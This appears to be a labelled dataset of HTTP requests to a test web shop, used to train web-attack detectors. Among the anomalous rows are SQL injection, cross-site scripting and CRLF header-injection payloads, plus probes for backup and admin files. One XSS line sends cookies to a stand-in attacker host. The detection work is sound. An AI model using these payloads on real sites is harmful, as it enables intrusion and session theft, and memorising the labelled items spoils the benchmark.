query,label
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=34&B1=A%F1adir+al+carrito HTTP/1.1,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
B2=Vaciar+carrito,0
id=1&nombre=Queso+Manchego&precioA=39&cantidad=94&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
modo=registro&login=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&password=alarm%3Fista&nombre=Zelina&apellidos=Morcillo+Amparan&email=colona%40aebo.lb&dni=86164975Y&direccion=Alamo%2C+S%2FN%2C+&ciudad=Casas+de+Reina&cp=05413&provincia=Salamanca&ntc=0630515936517830&B1=Registrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%252B&login=jana0&pwd=ma%F1ea0&remember=on&B1=Entrar HTTP/1.1,1
modo=entrar&login=lazlo&pwd=qu%EDnola&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/names.nsf HTTP/1.1,1
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wilsey&password=qU.8ncEN3RIO&nombre=Atanasio&apellidos=Espin%F3s+Marmesat&email=alejandre.mickel%40hiperbilbao.nl&dni=69054908F&direccion=Calle+Escultor+Ramon+Barba%2C+153+3-A&ciudad=Hinojal&cp=40191&provincia=Segovia&ntc=3163610251088637&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=93&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
modo=insertar&precio=1287&B1=Confirmar,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27OR%27a%3D%27a HTTP/1.1,1
id=2,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
errorMsg=Credenciales+incorrectasparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85%7C&cantidad=80&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/CFIDE/administrator/index.cfm HTTP/1.1,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombreA=Queso+Manchego&precio=85&cantidad=91&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alteen&password=SemIpleNamente&nombre=Viviana&apellidos=Rigola+Rojo&email=paquerette-walmsley%40gspace.noany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&dni=40627854X&direccion=Josep+Maria+De+Segarra+126%2C+&ciudad=Alzira&cp=34760&provincia=Barcelona&ntc=7818654303045497&B1=Registrar HTTP/1.1,1
modo=registro&login=pettinge&password=bArBiMOre_Na&nombre=Rey&apellidos=Rebull+Canudes&email=gold.medwin%40maridosadomicilio.no&dni=96457070S&direccion=C%2F+Narcisa+Freixas%2C+61+13%3FH&ciudad=Peralejos+de+Abajo&cp=45479&provincia=%C1vila&ntc=9303943122471890&B1=Registrar,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hormoz&password=79Ari68&nombre=Tamar&apellidos=Unger&email=ferrandis%40ilusionarium.is&dni=27110453P&direccion=C%2F+Tampa%2C+34+&ciudad=Molares%2C+Los&cp=05410&provincia=%257C&ntc=7701457023954310&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.bak HTTP/1.1,1
errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hermon&password=eNChUfE&nombre=Galatas&apellidos=Vilagine+Vilamitj%E0&email=negroni%40escarba.ki&dni=50245802W&direccion=Comun+150%2C+&ciudad=Quintanilla+del+Coco&cp=26124&provincia=M%E1laga&ntc=8158777429783500&B1=Registrar HTTP/1.1,0
id=2,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
modo=registro&login=gaftea&password=5a4a84e8a&nombre=Luciano&apellidos=Sarri%E0+Orbe&email=hartmann%40softstylestudio.sa&dni=72932222G&direccion=C%2F+Santo+Domingo+13+10%3FB&ciudad=Camponaraya&cp=25576&provincia=Lleida&ntc=9047664799943774&B1=Registrar,0
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=baheya&password=pOlvo&nombre=Shannen&apellidos=Fonterosa+V%E9jar&email=mccollon%40irmedia.ca&dni=14399392N&direccion=Calle+Arriola+29%2C+&ciudad=Armenteros&cp=08580&provincia=Guadalajara&ntc=5706258775201783&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%7C HTTP/1.1,1
modo=registro&login=fadhel&password=canaler3&nombre=Damasio&apellidos=Guito+Mat%F3&email=stribling.bettin%40bru%F1oseguridad.ye&dni=58753714F&direccion=Et%2Borbidea+*Galizia%2C+120+&ciudad=Tubilla+del+Agua&cp=16340&provincia=Toledo&ntc=4927358900726396&B1=Registrar,1
modo=registro&login=legolas&password=Z5R872Car5E&nombre=Helvecia&apellidos=Fuensalida+Liuzzi&email=stoichkov%40spainpharma.st&dni=70101170E&direccion=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&ciudad=Barracas&cp=17857&provincia=Palencia&ntc=6931646496457653&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5607&B1=%27OR%27a%3D%27a HTTP/1.1,1
http://localhost:8080/asf-logo-wide HTTP/1.1,1
modo=insertar%7C&precio=5930&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=de%3F-anna&pwd=j%2Baqu%E9s&remember=on&B1=Entrar HTTP/1.1,1
modo=registro&login=hache6&password=den21o9a&nombre=M%E1ximo&apellidos=Sendr%F3s+Tudanca&email=backy%40legami.tz&dni=85855294C&direccion=Glorieta+Farmaceutico+Perez+Jimenez+197%2C+&ciudad=L%FAcar&cp=16741&provincia=Lugo&ntc=5481930163785901&B1=Registrar,0
modo=registro&login=helma&password=92H126nA&nombre=Francisco+de+Borja&apellidos=Sofra+Galcer%E1n&email=mizell%40x2.com.vu&dni=61328646C&direccion=Parc+De+La+Budellera%2C+3%2C+4-B&ciudad=Outes&cp=43421&provincia=Huesca&ntc=0417370510264127&B1=Registrar,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
modo=entrar&login=salomo&pwd=cap2taz3&remember=off&B1=+,1
modo=insertar&precio=5106&B1=Pasar+por+caja,0
modo=insertar&precio=4135&B1=Confirmar,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
modo=insertar&precio=8112&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
modo=registro&login=ula&password=62r3.ej%F3n&nombre=Elisandro&apellidos=Abenoza+Esplugues&email=schwarzenegger%40cirugiaplasticacordoba.om&dni=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&direccion=Jota+Aragonesa+15+1F&ciudad=Espada%F1edo&cp=18516&provincia=Alicante&ntc=6708069843609931&B1=Registrar,1
idA=1,1
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=waldon&pwd=A6br9442&remember=on&B1=Entrar HTTP/1.1,0
modo=registro&login=cash3&password=urpila&nombre=Jeanne&apellidosA=Sandrini+Rotllant&email=olmer%40matchball.com.im&dni=52809393J&direccion=Pla%E7a+De+Can+Galta+Cremat%2C+111+&ciudad=Navia&cp=37447&provincia=C%E1diz&ntc=1124103686450000&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=606&B1=Pasar+por+caja HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=63&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,0
modo=registro&login=harmony&password=47eg0&nombre=Carola&apellidos=Samanieg+Mitteenn&email=tilbrook%40saludyfitness.pr&dni=68133766S&direccion=Calle+Virgen+De+La+Macarena+72+2-C&ciudad=Lorca&cp=28413&provincia=C%E1ceres&ntc=4717738233798026&B1=Registrar,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
id=1&nombre=Ques%2Bo+Manchego&precio=85&cantidad=80&B1=A%F1adir+al+carrito,1
http://localhost:8080/asf-logo-wide.gif.Bak HTTP/1.1,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=conroy7&pwd=nordes%21tal&remember=off&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
modoA=entrar&login=world.fa&pwd=entremeter&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/6909030637832563290.jsp.inc HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=salhany0&pwd=88l2f1r9&remember=on&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=halpin&password=apo4l936ca&nombre=Giovanni&apellidos=Riedel+Villaplana&email=bancroft%40lawn.mc&dni=15680534P&direccion=C%2F+Albaida%2C+165%2C+2-A&ciudad=Cella&cp=28505&provincia=Almer%EDa&ntc=7611183184008981&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
modo=registro&login=nettles&password=ra0iot4248%24%F36ica&nombre=Gattas&apellidos=Vai+Gala&email=prevost_toby%40ballobar.com.ad&dni=85765253R&direccion=Carretera+400+Al+Km.+9+Del+Km.+4+Valldemossa+135+&ciudad=Alf%E1ntega&cp=09146&provincia=Asturias&ntc=8012253702008773&B1=Registrar,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=myrtie&password=9uBIleTE&nombre=Aelohim&apellidos=Coria+Echecopar&email=bonnafe%40prensahp.mn&dni=12879968Z&direccion=C%2F+Vivers+102+&ciudadA=Moralina&cp=24288&provincia=Madrid&ntc=0201643055570272&B1=Registrar HTTP/1.1,1
modo=registro&login=cheuk7&password=7Onom9nIacA&nombre=Raleigh&apellidos=Jim%E9nez+Algora&email=polesello%40tantomontamontatanto.int&dni=40139732V&direccion=Calle+El+Jazmin%2C+144+6%3FD&ciudad=C%E1seda&cp=17120&provincia=Palencia&ntc=1717836675629432&B1=Registrar,0
http://localhost:8080/jstl-war/index.html HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=2542&B1=Confirmar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=durward&pwd=cOrDElAzO&remember=on&B1=Entrar HTTP/1.1,1
modo=insertar&precio=9345&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%4040 HTTP/1.1,1
http://localhost:8080/tienda1/publico/carrito.jsp/asf-logo-wide HTTP/1.1,1
modo=registro&login=mareah&password=malh5jo&nombre=Eulalio&apellidos=Tal%F3+Gorriz&email=trissenaar%40tetdevelocidad.uk&dni=18684547Z&direccion=C%2F+Hermanos+Senise+Colmenero%2C+153%2C+3-D&ciudad=Forua&cp=08470&provincia=Valencia&ntc=9004541540453342&B1=Registrar,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
modo=registro&login=irissou&password=ceg.ama&nombre=No%E9&apellidos=Esp%EDndola+Pavajeau&email=heal%40quadernideilgarda.gob&dni=19187311K&direccion=Hartzenbusch+98+&ciudad=Sagunto%2FSagunt&cp=45314&provincia=Baleares+%28Illes%29&ntc=8622247853302054&B1=Registrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=singyu&pwd=e88r6ber%EDa&remember=off&B1=Entrar HTTP/1.1,0
id=2&nombre=Vino+Rioja&precio=100&cantidad=90&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/.java HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&pwd=2anc580a95r&remember=off&B1=Entrar HTTP/1.1,1
errorMsgA=Credenciales+incorrectas,1
modo=entrar&login=hrenyk&pwd=embozalar&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/4861362529278789730 HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg/6909030637832563290.jsp.inc HTTP/1.1,1
idA=2,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tiong-ho&password=an1l5m9no&nombre=S%2Btyli-anos&apellidos=Subias&email=parada.biuchet4%40aulahost.gw&dni=79845869N&direccion=Jacinto+Benavente%2C+165+7F&ciudad=Herreruela&cp=11330&provincia=Teruel&ntc=4461899477803914&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=20&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gustave&password=v3o8720a&nombre=Mar%EDa+Begonia&apellidos=Fain%E9+Motj%E9&email=dyne%40somosagelespa%F1a.us&dni=30663985V&direccionA=Calle+Antonio+Gramsci+30%2C+12%3FB&ciudad=Narros+del+Puerto&cp=40183&provincia=Zamora&ntc=4102151120364510&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=osburn&password=48AsTa5O&nombre=Edilio&apellidos=Credid%EDo+Poma&email=ahern.plott%40zonamodelos.fr&dni=36839675T&direccion=Patio+Pico+De+Aneto%2C+122+13-C&ciudad=Cuevas+del+Almanzora&cp=10666&provincia=Zamora&ntc=1933711327714835&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&password=bullanguera&nombre=Ricardina&apellidos=Cusquisiban+Ocifuente&email=greenleaf.garcia%40lodgemadrid.np&dni=09092887K&direccion=Avenida+Santa+Marina+39%2C+&ciudad=San+Mart%EDn+del+R%EDo&cp=34219&provincia=Palencia&ntc=2461453971721816&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=6&B1=A%F1adir+al+carrito HTTP/1.1,0
modo=entrar&login=abbai&pwd=incesta%24r&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cleve&password=guiSada&nombre=Lila&apellidos=Fen%E9s+Montanuy&email=bekkouche%40aadsl.hu&dni=74492868P&direccion=Padre+Isla%2C+S%2FN%2C+&ciudad=Castrillo+de+Duero&cp=48950&provincia=Baleares+%28Illes%29&ntc=648492740335689&B1=Registrar HTTP/1.1,1
errorMsgA=Credenciales+incorrectas,1
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
modo=registro&login=michial3&password=83o3i7a374&nombre=Teodomira&apellidos=D%27Paoli+Garros&email=bessell%40ttivoni.is&dni=32124292P&direccion=C%2F+Montevideo+193%2C+&ciudad=Rupi%E0&cp=39572&provincia=Burgos&ntc=8086742983774365&B1=Registrar,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=38&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=61&B1=A%F1adir+al+carrito HTTP/1.1,0
modo=registro&login=sharnoff&password=patr%EDsTica&nombre=Eli&apellidos=Cabrer+Gascon&email=sergyl%40intercambiodeenlaces.gh&dni=76518142V&direccion=C%2F+Alcalde+Conangla+S%2FN%2C+&ciudad=Pinar%2C+El&cp=37793&provincia=Zaragoza&ntc=4336085166451274&B1=Registrar,0
http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/4861362529278789730 HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=aleksand&password=cerramiento&nombre=Gerarda&apellidos=Lao&email=shukuri%40velaconsultores.nl&dni=54415049Q&direccion=Pasaje+Pedrosa+115%2C+6F&ciudad=Mieza&cp=47400&provincia=C%E1ceres&ntc=5563798964634481&B1=Registrar HTTP/1.1,0
modo=registro&login=schadan&password=ExCEPtaCi%D3n&nombre=Hemilce&apellidos=Cubells&email=le-van-kim%40la-sexta-f1.ro&dni=10750198K&direccion=C%2F+Bandera+125+8-C&ciudad=Benicolet&cp=08980&provincia=C%E1ceres&ntc=6076862768016563&B1=Registrar,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.gif/.Bak HTTP/1.1,1
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
modo=insertar&precio=2026&B1=Confirmar%2F,1
modo=registro&login=myong&password=colOrISmo&nombre=Dagmar&apellidos=Cabane+Molas&email=holton%40enigmatico.vu&dni=91624095F&direccion=Don+Ferreol+Hernandez+S%2FN%2C+&ciudad=Calders&cp=37183&provincia=Salamanca&ntc=6035116303925311&B1=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E HTTP/1.1,1
id=2,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9536&B1=Pasar+por+caja%2F HTTP/1.1,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=torre&password=4ere3id13&nombre=Yesenia&apellidos=Da+Silva+Kerber&email=tchjan-lian.quadflieg%40comerciosdeaspe.se&dni=02056001P&direccion=Angel+Martin+Puebla+157%2C+&ciudad=Almonacid+de+la+Sierra&cp=16535&provincia=Almer%EDa&ntc=3467840384205414&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,1
modo=entrar&login=woins%3Fky&pwd=pagaDEra&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
modo=registro&login=anchia&password=s4pe9iorm9n8e&nombre=Indemira&apellidos=Tejo&email=ronnback.pitre%40pro-isfv.nc&dni=12199825G&direccion=Trobos+39+4E&ciudad=Coves+de+Vinrom%E0%2C+les&cp=34126&provincia=Asturias&ntc=2239348379899052&B1=Registrar,0
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2876&B1=Confirmar%2F HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=faez&pwd=9fi247A&remember=on&B1A=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
modo=entrar&login=ossie&pwd=introducci%F3n&remember=on&B1=Entrar,0
modo=registro&login=blakesle&password=ch07ico3o&nombre=Jerem%EDas&apellidos=Maslo+Arrunategui&email=ratcliff%40mataroweb.gw&dni=26853011M&direccion=Calle+Felipe+De+Diego+191%2C+2Hparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&ciudad=Montefr%EDo&cp=36520&provincia=Burgos&ntc=3246825984475356&B1=Registrar,1
http://localhost:8080/iisadmpwd/aexp2b.htr HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winona&password=pic%F3n&nombre=Nayla&apellidos=Torre+Xu&email=hyer_longdon0%40artforall.mc&dni=83627503D&direccion=Calle+Corbina%2C+100+&ciudad=Hornillos+de+Cameros&cp=46691&provincia=Cuenca&ntc=5175565918974704&B1=%4040 HTTP/1.1,1
modo=registro&login=hernzlia&password=dIF3MA79753&nombre=Osorio&apellidos=Mans+Vi%F1as&email=sone%40tristanyvioletina.nf&dni=70806659D&direccion=C%2F+Lago+Ba%F1olas+40+&ciudad=%22+AND+%221%22%3D%221&cp=41870&provincia=Cantabria&ntc=3259495581211566&B1=Registrar,1
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
modo=registro&login=stokker&password=do6a3er8&nombre=Leandra&apellidos=Orpez+Almod%F3var&email=schaab%40hispadis.li&dni=96068417Q%3F&direccion=Calle+Montduber+75%2C+12%3FH&ciudad=Magacela&cp=04275&provincia=Lleida&ntc=1530487510362018&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=attilla&password=hIe4%E1t*i29&nombre=Neyen&apellidos=Oll%E9+Verdin&email=balfour.riabinkina%40monsur.ls&dni=7A%279417AM&direccion=Calle+Iztueta%2C+105+&ciudad=Sant+Mart%ED+de+Riucorb&cp=01427&provincia=Salamanca&ntc=1701163791515432&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
modo=registro&login=yitan&password=barraquer6&nombre=Pirro&apellidos=Zurita+Santander&email=gisladottir%40ingenieriadelaconstruccion.bh&dni=96580643D&direccion=C%2F+Chisperos%2C+S%2FN%2C+3-H&ciudad=*Ceclav%EDn&cp=43144&provincia=Burgos&ntc=6951238720062630&B1=Registrar,1
